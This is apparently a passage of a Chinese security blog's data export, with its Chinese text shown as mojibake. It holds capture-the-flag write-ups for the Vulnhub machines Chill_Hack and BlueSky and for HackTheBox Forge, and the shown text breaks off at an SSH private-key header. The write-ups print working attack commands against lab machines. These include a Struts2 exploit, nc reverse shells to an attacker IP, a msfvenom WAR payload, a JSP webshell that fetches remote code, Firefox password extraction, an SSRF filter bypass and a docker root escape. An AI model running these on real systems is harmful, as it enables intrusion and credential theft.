æœ‰ç‚¹æ„æ€\n\næ—¢ç„¶æˆ‘ä»¬æ²¡æœ‰æƒé™è¯»å–local.txtæ–‡ä»¶ é‚£å°±è®©apaaræ¥è¯»å–å§\n\n![](Vulnhub-Chill_Hack/image39.png)\n\nå•Šè¿™ æˆ‘è¿˜ä»¥ä¸ºæ˜¯ä»€ä¹ˆææƒçš„ä¸œè¥¿å‘¢ ç»“æœä½ å‘Šè¯‰æˆ‘ è¿™å°±æ˜¯ä¸ªflagï¼Ÿ\n\né‚£ä¹Ÿè¡Œå§ flag1 get {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}\n\nOK å’±ä»¬ç»§ç»­æ‰¾å…¶ä»–æ–¹æ³•ææƒå§\n\nè¾“å…¥idæŸ¥çœ‹æƒé™\n\n![](Vulnhub-Chill_Hack/image40.png)\n\nå—¯ï¼Ÿdockerï¼Ÿè¦ç´ å¯Ÿè§‰\n\næˆ‘ä»¬ä½¿ç”¨ä¸€äº›ææƒè¾…åŠ©å·¥å…·[https://gtfobins.github.io/](https://gtfobins.github.io/) åœ¨é‡Œé¢æœæœdocker\n\n![](Vulnhub-Chill_Hack/image41.png)\n\nä½¿ç”¨æ­¤å‘½ä»¤å³å¯ææƒdocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n\n![](Vulnhub-Chill_Hack/image42.png)\n\n![](Vulnhub-Chill_Hack/image43.png)\n\nææƒæˆåŠŸ\n\nè¿›å…¥rootç›®å½• æ‹¿åˆ°æœ€åä¸€ä¸ªflag\n\n![](Vulnhub-Chill_Hack/image44.png)\n\nFlag2 get {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}\n\næ€»ç»“è¯­ï¼šæ€ä¹ˆè¯´å‘¢ï¼Œè¿™ä¸ªé¶åœºè¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚æˆ‘èµ·åˆä»¥ä¸ºå°±æ˜¯ç®€å•çš„ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œgetshellä»¥åä¸€ä¸ªè„šæœ¬ææƒå°±æ‹¿ä¸‹äº†ã€‚æ²¡æƒ³åˆ°è¿˜æœ‰è¿™ä¹ˆå¤šæ­¥éª¤ï¼ŒæŒºä¸¥è°¨çš„å§\n","tags":["Vulnhub"]},{"title":"BlueSky - Vulnhub","url":"/2021/10/07/Vulnhub/Vulnhub -BlueSky/","content":"\n# é¶åœºå®æˆ˜ Vulnhub-BlueSky\n\né¦–å…ˆä½¿ç”¨kaliæ‰«æé¶åœºçš„IPåœ°å€\n\nArp-scan â€“l\n\n![](Vulnhub-BlueSky/image1.png)\n\nå¯¹æ¯”MACåœ°å€ æˆåŠŸå¾—åˆ°é¶åœºIPåœ°å€192.168.72.131\n\nè¿›è¡Œç«¯å£æ‰«æ\n\nNmap â€“Sv â€“v 192.168.72.131\n\n![](Vulnhub-BlueSky/image2.png)\n\nå¼€æ”¾äº†ç«¯å£22å’Œ8080\n\n22ä¸ºSSHç«¯å£ï¼Œçªç ´å¤šåŠéƒ½æ˜¯å¼±å£ä»¤ï¼Œå’±ä»¬å…ˆä¸è€ƒè™‘è¿™ç§æƒ…å†µï¼Œè®¿é—®8080çš„WEBæœåŠ¡å™¨çœ‹çœ‹\n\n[http://192.168.72.131:8080](http://192.168.72.131:8080/)\n\n![](Vulnhub-BlueSky/image3.png)\n\nè®¿é—®åå‘ç°æ˜¯tomcat 9.0.40 ç¬¬ä¸€æ—¶é—´æƒ³åˆ°äº†tomcatçš„cveæ¼æ´\n\nä½¿ç”¨searchsploitæœç´¢ tomcat 9.0.40çš„æ¼æ´\n\n![](Vulnhub-BlueSky/image4.png)\n\nå—¯â€¦å¥½åƒæ²¡æœ‰\n\né‚£å°±æµ‹è¯•ä¸€æ³¢0dayå§(å¼±å£ä»¤)\n\nTomcat/tomcat\n\nAdmin/admin\n\n![](Vulnhub-BlueSky/image5.png)\n\nOK ç¡®è®¤æ²¡æœ‰0day\n\né‚£å°±åªèƒ½æ‰¾è¯¥ç‰ˆæœ¬å­˜åœ¨çš„æ¼æ´äº†\n\nåœ¨ç™¾åº¦æ‰¾åˆ°ä¸€ä¸ªstruts2-showcaseçš„æ¼æ´ï¼ˆs2-048è¿œç¨‹ä»£ç æ‰§è¡Œï¼‰\n\nå¥½å®¶ä¼™ ç›´æ¥ä¸Šå·¥å…·äº†å“ˆ å°±æ‡’å¾—å†æµ‹è¯•äº†\n\nurl: [http://192.168.72.131:8080/struts2-showcase/index.action](http://192.168.72.131:8080/struts2-showcase/index.action)\n\n![](Vulnhub-BlueSky/image6.png)\n\nå¥½å®¶ä¼™ è¿™ä¸ªURLæˆ‘çˆ†ç›®å½•è¿˜æ²¡çˆ†å‡ºæ¥ åœ¨ç½‘ä¸Šæœç´¢ç›¸å…³æ¼æ´æ‰æ‰¾åˆ°\n\nä¸‹è½½exp\n\ngit clone [https://github.com/jrrdev/cve-2017-5638.git](https://github.com/jrrdev/cve-2017-5638.git)\n\næµ‹è¯•æ˜¯å¦å­˜åœ¨æ¼æ´\n\npython exploit.py \"http://192.168.72.131:8080/struts2-showcase/index.action\" \"whoami\"\n\n![](Vulnhub-BlueSky/image7.png)\n\nwhoamiæ‰§è¡ŒæˆåŠŸ\n\næŸ¥çœ‹æ˜¯å¦å­˜åœ¨ncæƒé™\n\npython exploit.py \"http://192.168.72.131:8080/struts2-showcase/index.action\" \"nc\"\n\n![](Vulnhub-BlueSky/image8.png)\n\nå­˜åœ¨ncæƒé™çš„ ä½†ä¼¼ä¹æ²¡æœ‰nc â€“eçš„æƒé™ å¾—é€šè¿‡å…¶ä»–æ–¹å¼åå¼¹shelläº†\n\né¦–å…ˆä½¿ç”¨mknodå»ºç«‹ç®¡é“\n\nPython exploit.py \"http://192.168.72.131:8080/struts2-showcase/index.action\" \"mknod /tmp/backpipe p\"\n\n![](Vulnhub-BlueSky/image9.png)\n\nKaliç›‘å¬4444ç«¯å£\n\nNc â€“nvlp 4444\n\n![](Vulnhub-BlueSky/image10.png)\n\nåå¼¹shellï¼Œå°†å†…å®¹ä¼ é€’ç‰©ä½¿ç”¨ç®¡é“æ–‡ä»¶pä½œä¸ºæ¡¥æ¢ï¼Œè¿›è¡Œæ•°æ®é‡å®šå‘ä¼ é€’\n\npython exploit.py \"http://192.168.72.131:8080/struts2-showcase/index.action\" -c \"/bin/sh 0</tmp/p | nc 192.168.72.133 4444 1>/tmp/p\"\n\n![](Vulnhub-BlueSky/image11.png)\n\næ­£å¸¸æ¥è¯´ç°åœ¨kaliæ˜¯ä¼šè·å–åˆ°ä¸€ä¸ªncçš„shellçš„ï¼Œä½†æˆ‘è¿™è¾¹ä¸çŸ¥é“ä»€ä¹ˆåŸå› æ— æ³•æˆåŠŸï¼Œå…ˆæ•™å¤§å®¶æ­¤æ–¹æ³•ç»§ç»­æ“ä½œçš„æ–¹æ³•ï¼Œæˆ‘å†æ¼”ç¤ºæˆ‘è‡ªå·±åšçš„æ›¿ä»£çš„æ–¹æ³•\n\nè·å–åˆ°shellååœ¨shellå†…è¿è¡Œ\n\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\nå› ä¸ºé¶æœºç¯å¢ƒå†…æ²¡æœ‰python2çš„ç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨python3æå‡ä¸ºä¸€ä¸ªäº¤äº’å¼shellå°±å¯ä»¥äº†\n\nç¬¬äºŒç§æ–¹æ³•ï¼š\n\nç¬¬äºŒç§æ–¹æ³•æˆ‘ä»¬ä½¿ç”¨windowæ¥è¿›è¡Œæ¸—é€\n\né¦–å…ˆä½¿ç”¨struts2çš„å›¾å½¢åŒ–éªŒè¯å·¥å…·è¿›è¡Œæ¼æ´éªŒè¯\n\n![](Vulnhub-BlueSky/image12.png)\n\nå¾—åˆ°ç›®å½•åœ°å€\n\nwebpath:/usr/local/tomcat/webapps/struts2-showcase/\n\nç›´æ¥ä¸Šä¼ å¤§é©¬ä¼šè¶…å‡ºå­—èŠ‚é™åˆ¶\n\nä¸Šä¼ å†°èçš„é©¬å†°èä¼šæ— æ³•è¯†åˆ«webshellçš„å¯†ç \n\nç›´æ¥ä¸Šä¼ èšå‰‘çš„é©¬ä¹Ÿä¼šè¶…å‡ºå­—èŠ‚é™åˆ¶\n\né‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿ\n\nå¾ˆå¥½è§£å†³ï¼Œé¦–å…ˆæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªä¸‹è½½æ–‡ä»¶çš„ä¸€å¥è¯æœ¨é©¬\n\n![](Vulnhub-BlueSky/image13.png)\n\nå¾—åˆ°webshellåœ°å€\n\n[http://192.168.72.131:8080/struts2-showcase/111.jsp](http://192.168.72.131:8080/struts2-showcase/111.jsp)\n\nç„¶ååœ¨æœ¬åœ°æ­å»ºä¸€ä¸ªwebæœåŠ¡å™¨ï¼ŒæŠŠè¦ä½¿ç”¨çš„ä¸€å¥è¯æœ¨é©¬æˆ–å¤§é©¬æ”¾åœ¨é‡Œé¢ï¼Œä½¿ç”¨è¯¥ä¸€å¥è¯æœ¨é©¬è¿›è¡Œè®¿é—®ä¸‹è½½\n\n[http://192.168.72.131:8080/struts2-showcase/111.jsp?f=/usr/local/tomcat/webapps/struts2-showcase/222.jsp&u=http://192.168.0.159/333.jsp](http://192.168.72.131:8080/struts2-showcase/111.jsp?f=/usr/local/tomcat/webapps/struts2-showcase/222.jsp&u=http://192.168.0.159/333.jsp)\n\nä¸Šé¢çš„222.jspæ˜¯è¦ä¿å­˜çš„webshellé©¬åå­—\n\n333.jspæ˜¯æˆ‘ä»¬åœ¨æœ¬åœ°webæœåŠ¡å™¨å†…å‚¨å­˜çš„åå­—\n\n111.jspæ˜¯å½“å‰çš„ä¸‹è½½é©¬\n\n![](Vulnhub-BlueSky/image14.png)\n\næˆåŠŸä¸‹è½½èšå‰‘çš„ä¸€å¥è¯æœ¨é©¬\n\n![](Vulnhub-BlueSky/image15.png)\n\nå¯ä»¥æˆåŠŸè®¿é—®æ–‡ä»¶ï¼Œä½†æˆ‘ä»¬å‘ç°è¯¥ä¸€å¥è¯æœ¨é©¬ä¼¼ä¹æ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œé‚£æ€ä¹ˆåŠå‘¢ï¼Ÿ\n\nå°é—®é¢˜ï¼Œæˆ‘ä»¬åˆ©ç”¨tomcatæœ¬èº«çš„æ¼æ´è¿›è¡Œææƒå°±å¥½äº†\n\né¦–å…ˆæ‰¾åˆ°tomcatçš„è´¦å·æœ¨é©¬\n\nåœ°å€ï¼š/usr/local/tomcat/conf/tomcat-users.xml\n\nç¬¬45è¡Œ\n\n<user username=\"admin\" password=\"6mzf3>gfZ.pN8_Mp\" roles=\"manager-gui\"/>\n\næˆåŠŸå¾—åˆ°\n\nè´¦å·ï¼šadmin\n\nå¯†ç ï¼š6mzf3>gfZ.pN8_Mp\n\n![](Vulnhub-BlueSky/image16.png)\n\næ³¨æ„ï¼šæ­¤æ–¹æ³•è¾ƒä¸ºéº»çƒ¦ï¼Œä¸»è¦ç”¨äºæ— æ³•ä½¿ç”¨ncå¼¹å›shellçš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œæˆ‘è¿™è¾¹ä½¿ç”¨äº†å„ä¸ªæ–¹æ³•éƒ½æ— æ³•å¼¹å›ï¼Œä¸å¾—å·²ä¹‹ä¸‹æ‰ä½¿ç”¨è¿™ä¸ªæ–¹æ³•\n\nç°åœ¨æˆ‘ä»¬å›åˆ°ç½‘é¡µå»ç™»å½•è´¦å·å¯†ç \n\n![](Vulnhub-BlueSky/image17.png)\n\nç™»é™†åçš„çŠ¶æ€\n\n![](Vulnhub-BlueSky/image18.png)\n\næˆ‘ä»¬å‘ç°ä¸‹é¢å¯ä»¥éƒ¨ç½²æ–‡ä»¶ï¼ŒOK é‚£å°±å¥½åŠäº†\n\nä½¿ç”¨WARæœ¨é©¬ä¸Šä¼ åå¼¹shellå°±æå®šäº†\n\nä½¿ç”¨msfvenomç”Ÿæˆwaré©¬\n\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.72.133 LPORT=5555 -f war -o shell.war\n\n![](Vulnhub-BlueSky/image19.png)\n\nOK æˆ‘ä»¬å»ä¸Šä¼ \n\n![](Vulnhub-BlueSky/image20.png)\n\næˆåŠŸä¸Šä¼ åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°/shell è¿™å°±æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„waré©¬\n\nåœ¨kaliä¸­ç›‘å¬5555ç«¯å£\n\nNc â€“nvlp 5555\n\n![](Vulnhub-BlueSky/image21.png)\n\nç„¶åå»è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„waré©¬\n\ncurl http://192.168.72.131:8080/shell/\n\n![](Vulnhub-BlueSky/image22.png)\n\nOK æˆ‘ä»¬æˆåŠŸè·å–åˆ°ä¸€ä¸ªshell\n\n![](Vulnhub-BlueSky/image23.png)\n\nåŒæ ·çš„æˆ‘ä»¬ä½¿ç”¨python3è·å–ä¸€ä¸ªäº¤äº’å¼shell\n\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n![](Vulnhub-BlueSky/image24.png)\n\næŸ¥çœ‹user.txtæ–‡ä»¶ æˆåŠŸè·å–userè´¦æˆ·çš„flag\n\n![](Vulnhub-BlueSky/image25.png)\n\næˆ‘ä»¬æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶\n\nLs â€“a\n\n![](Vulnhub-BlueSky/image26.png)\n\nåœ¨ç”¨æˆ·æ ¹ç›®å½•ä¸‹å‘ç°mozilla firefoxæµè§ˆå™¨æ–‡ä»¶\n\nå¯¹æˆ‘æ¥è¯´ï¼Œæœ€æƒ³è¦å¾—åˆ°çš„å°±æ˜¯å®ƒçš„ç”¨æˆ·åå¯†ç è®°å½•\n\nä¸åŒç‰ˆæœ¬çš„Firefoxä¿å­˜å¯†ç è®°å½•çš„æ–‡ä»¶åç§°ä¸åŒï¼Œåœ¨ç½‘ä¸Šæ‰¾åˆ°firefoxæµè§ˆå™¨å­˜å‚¨ç”¨æˆ·åå¯†ç çš„æ–‡ä»¶æ˜¯logins.jsonï¼ˆç‰ˆæœ¬å·å¤§äºç­‰äº32.0ï¼‰æˆ–è€…signons.sqliteï¼ˆç‰ˆæœ¬å·å¤§äºç­‰äº3.5ï¼Œå°äº32.0ï¼‰ï¼Œ\n\nå…·ä½“ä¿¡æ¯å‚è€ƒï¼š[http://kb.mozillazine.org/Profile_folder_-_Firefox](http://kb.mozillazine.org/Profile_folder_-_Firefox)\n\nè¿›å…¥ä½ç½®\n\n.mozilla/firefox/fvbljmev.default-release\n\nå¯ä»¥çœ‹åˆ°ä¸¤ä¸ªæ–‡ä»¶\n\nkey4.db logins.json\n\næˆ‘ä»¬è¦æŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶æå‡ºæ¥\n\nä½¿ç”¨python3å¼€å¯webæœåŠ¡å™¨\n\npython3 -m http.server 6666\n\nä½¿ç”¨wgetæˆåŠŸæ‹·è´ä¸¤ä¸ªæ–‡ä»¶\n\nwget [http://192.168.72.131:6666/logins.json](http://192.168.72.131:6666/logins.json)\n\nwget [http://192.168.72.131:6666/key4.db](http://192.168.72.131:6666/key4.db)\n\n![](Vulnhub-BlueSky/image27.png)\n\nä¸‹è½½è§£å¯†è„šæœ¬\n\n[https://github.com/lclevy/firepwd](https://github.com/lclevy/firepwd)\n\ngit clone https://github.com/lclevy/firepwd.git\n\ncd firepwd\n\npip3 install -r requirements.txt\n\n![](Vulnhub-BlueSky/image28.png)\n\nè¿è¡Œpython3 firepwd.py\n\n[https://twitter.com:b'minhtuan',b'skysayohyeah](https://twitter.com:b'minhtuan',b'skysayohyeah)'\n\nå¾—åˆ°è´¦å·ï¼šminhtuan\n\nå¾—åˆ°å¯†ç ï¼šskysayohyeah\n\næˆ‘ä»¬ä½¿ç”¨sudo â€“læŸ¥çœ‹sudoæƒé™\n\n![](Vulnhub-BlueSky/image29.png)\n\næƒé™æŒºé«˜ ç›´æ¥sudo suå³å¯æˆåŠŸææƒ\n\n![](Vulnhub-BlueSky/image30.png)\n\n![](Vulnhub-BlueSky/image31.png)\n\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag\n\næœ¬æ¬¡é¶åœºå®Œæˆ\n","tags":["Vulnhub"]},{"title":"Forge - Hackthebox","url":"/2021/09/28/Hackthebox/Medium/Hackthebox-Forge/","content":"\n# Hackthebox - Forge\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Forge/image1.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Forge/image2.png)\n\n## ä¿¡æ¯æœé›†\né¦–å…ˆä½¿ç”¨nmapæ‰«æä¸€ä¸‹ç«¯å£\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.111\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 21:51 EDT\nWarning: 10.10.11.111 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.11.111\nHost is up (0.35s latency).\nNot shown: 65532 closed ports\nPORT   STATE    SERVICE VERSION\n21/tcp filtered ftp\n22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)\n|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)\n|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)\n80/tcp open     http    Apache httpd 2.4.41\n|_http-title: Did not follow redirect to http://forge.htb\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=9/26%OT=22%CT=1%CU=32048%PV=Y%DS=2%DC=T%G=Y%TM=615123F\nOS:0%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1\nOS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   358.39 ms 10.10.14.1\n2   358.42 ms 10.10.11.111\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 71.65 seconds\n```\nè¿™è¾¹åªå¼€äº†`22`å’Œ`80`ç«¯å£ï¼Œå’±ä»¬å»çœ‹çœ‹`80`ç«¯å£çš„httpæœåŠ¡å†…å®¹\n\n![](Hackthebox-Forge/image3.png)\n\nè®¿é—®åç›´æ¥è¢«è·³è½¬åˆ°äº†`forge.htb`åŸŸåï¼Œè¿™é‡Œå’±ä»¬åŠ ä¸€ä¸ªåŸŸåè§£æ\n\n```Plain Text\necho 10.10.11.111 forge.htb >> /etc/hosts\n```\nç„¶åå†è®¿é—®ä¸€æ¬¡\n\n![](Hackthebox-Forge/image4.png)\n\nè¿™é‡Œæœ‰ä¸ªä¸Šä¼ åŠŸèƒ½ï¼Œå»è¯•ä¸€ä¸‹æ˜¯å¦å¯ä»¥ä¸Šä¼ \n\n![](Hackthebox-Forge/image5.png)\n\nä¸Šä¼ åä¼šè¢«å»æ‰åç¼€ï¼Ÿè¿˜æ˜¯æ€ä¹ˆç€ä¸å¤ªæ˜ç™½ï¼Œåæ­£æ²¡æœ‰è§£æï¼Œæ‰¾ä¸€ä¸‹å…¶ä»–æ€è·¯å§\n\nä¸»é¡µä¸Šæ²¡æœ‰ä»€ä¹ˆå¯çœ‹çš„ä¸œè¥¿äº†ï¼Œçˆ†ä¸€ä¸‹ç›®å½•å’Œå­åŸŸåå§\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 200 -u http://forge.htb/\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://forge.htb/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\n2021/09/26 22:14:58 Starting gobuster in directory enumeration mode\n===============================================================\nhttp://forge.htb/uploads              (Status: 301) [Size: 224] [--> http://forge.htb/uploads/]\nhttp://forge.htb/static               (Status: 301) [Size: 307] [--> http://forge.htb/static/]\nhttp://forge.htb/upload               (Status: 200) [Size: 929]\nhttp://forge.htb/server-status        (Status: 403) [Size: 274]\n===============================================================\n2021/09/26 22:29:14 Finished\n===============================================================\n```\nè¿™é‡Œç›®å½•æ²¡çˆ†å‡ºä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå†å»æ‰«æDNSçœ‹çœ‹\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r -t 50 -u forge.htb\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:          http://forge.htb\n[+] Method:       GET\n[+] Threads:      50\n[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n[+] User Agent:   gobuster/3.1.0\n[+] Timeout:      10s\n===============================================================\n2021/09/26 22:48:35 Starting gobuster in VHOST enumeration mode\n===============================================================\nFound: admin.forge.htb (Status: 200) [Size: 27]\n===============================================================\n2021/09/26 22:50:16 Finished\n===============================================================\n```\næ‰¾åˆ°äº†ä¸€ä¸ª`admin`å­åŸŸåï¼Œæ·»åŠ åˆ°`hosts`åå†å»è¯•è¯•\n\n```Plain Text\necho 10.10.11.111 admin.forge.htb >> /etc/hosts\n```\n![](Hackthebox-Forge/image6.png)\n\nè®¿é—®åæç¤ºåªå…è®¸æœ¬åœ°ä¸»æœºï¼Œå¾—æƒ³åŠæ³•ç»•è¿‡ä¸€ä¸‹\n\n## æ¼æ´åˆ©ç”¨\næ•´ç†ä¸€ä¸‹ç›®å‰çš„ä¿¡æ¯\n\n1. `forge.htb`ä¸ºä¸€ä¸ªä¸Šä¼ ç‚¹\n2. `admin.forge.htb`åªå…è®¸æœ¬åœ°è®¿é—®\n\nå’±ä»¬å’±ä»¬æŠ“ä¸€ä¸‹ä¸Šä¼ ç‚¹çš„åŒ…çœ‹çœ‹å†…å®¹\n\n![](Hackthebox-Forge/image7.png)\n\nçœ‹åˆ°åé¢æ‰å‘ç°è¿™ä¸ªé¡µé¢è¿˜æœ‰ä¸€ä¸ª`Upload from url`çš„åŠŸèƒ½ï¼Œç–å¿½äº†ã€‚\n\næŠ“ä¸ªåŒ…çœ‹çœ‹\n\n![](Hackthebox-Forge/image8.png)\n\nè¿™è¾¹éšä¾¿è¾“å…¥ç‚¹ä¸œè¥¿ä»¥åï¼Œæ˜¾ç¤ºæ”¯æŒ`http`å’Œ`https`åè®®ï¼Œå†ç»“åˆæˆ‘ä»¬ä¹‹å‰çš„`admin.forge.htb`æ¥çœ‹ï¼Œè¿™ä¸å°±æ˜¯ä¸€ä¸ªå¦¥å¦¥çš„SSRFï¼Ÿ\n\n![](Hackthebox-Forge/image9.png)\n\nè¿™æ ·åˆ©ç”¨åï¼Œæ˜¾ç¤ºè¯¥URLè¢«åˆ—å…¥äº†é»‘åå•ï¼Œéœ€è¦æƒ³åŠæ³•ç»•è¿‡ä¸€ä¸‹\n\n![](Hackthebox-Forge/image10.png)\n\nå°è¯•æ€§ä½¿ç”¨å¤§å°å†™ç»•è¿‡æ–¹å¼è½»è½»æ¾æ¾ç»•è¿‡ï¼Œè¿”å›äº†ä¸€ä¸ªURLï¼Œæ‰“å¼€çœ‹çœ‹\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl http://forge.htb/uploads/2Y6eGsD37WCBc1m3pSJO\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Admin Portal</title>\n</head>\n<body>\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/main.css\">\n    <header>\n            <nav>\n                <h1 class=\"\"><a href=\"/\">Portal home</a></h1>\n                <h1 class=\"align-right margin-right\"><a href=\"/announcements\">Announcements</a></h1>\n                <h1 class=\"align-right\"><a href=\"/upload\">Upload image</a></h1>\n            </nav>\n    </header>\n    <br><br><br><br>\n    <br><br><br><br>\n    <center><h1>Welcome Admins!</h1></center>\n</body>\n</html>\n```\næˆåŠŸè¯»å–åˆ°å†…å®¹ï¼Œç»™äº†ä¸€ä¸ª`/announcements`ç›®å½•\n\nè®©æˆ‘ä»¬æ‹¿å»å†å»è¯»å–ä¸€ä¸‹ï¼Œè¿”å›äº†åŸŸåï¼Œæ¥ç€è®¿é—®\n\n```Plain Text\nhttp://forge.htb/uploads/CnrWy5jKhQ1mykfx1ONY\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl http://forge.htb/uploads/CnrWy5jKhQ1mykfx1ONY\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Announcements</title>\n</head>\n<body>\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/main.css\">\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/static/css/announcements.css\">\n    <header>\n            <nav>\n                <h1 class=\"\"><a href=\"/\">Portal home</a></h1>\n                <h1 class=\"align-right margin-right\"><a href=\"/announcements\">Announcements</a></h1>\n                <h1 class=\"align-right\"><a href=\"/upload\">Upload image</a></h1>\n            </nav>\n    </header>\n    <br><br><br>\n    <ul>\n        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>\n        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>\n        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=<url>.</li>\n    </ul>\n</body>\n</html>\n```\n```Plain Text\næˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªFTPè´¦å·å¯†ç \nusername = user\npassword = heightofsecurity123!\n```\nè¿™è¾¹æç¤ºftpä¸èƒ½è¢«å¤–éƒ¨ç™»å½•ï¼Œä½†uploadæ¥å£å¯ä»¥ä½¿ç”¨`?u=`å‚æ•°æŒ‡å®šftp url\n\n```Plain Text\nurl=http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@127.1.1.1&remote=1\n```\nç»§ç»­è°ƒç”¨\n\n```Plain Text\nhttp://forge.htb/uploads/BRrgg0w44uZvHW3WEnWz\n```\nç»§ç»­è®¿é—®ï¼Œè¿™ä¸ªæ­¥éª¤é‡å¤æ€§å¥½é«˜å•Š\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl http://forge.htb/uploads/BRrgg0w44uZvHW3WEnWz                                                                                                                                                          1 âš™\ndrwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap\n-rw-r-----    1 0        1000           33 Sep 24 18:02 user.txt\n```\nè¿™æ ·è·å–å¥½éº»çƒ¦ï¼Œåˆä¸æƒ³ï¼ˆhuiï¼‰å†™è„šæœ¬ï¼Œè¯•è¯•çœ‹æœ‰æ²¡æœ‰ç§é’¥å§\n\n```Plain Text\nurl=http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@127.1.1.1/.ssh/id_rsa&remote=1\n```\n```Plain Text\nhttp://forge.htb/uploads/cBNUTYA6eT50o5vEjpY1\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl http://forge.htb/uploads/cBNUTYA6eT50o5vEjpY1\n-----BEGIN OPENSSH PRIVATE 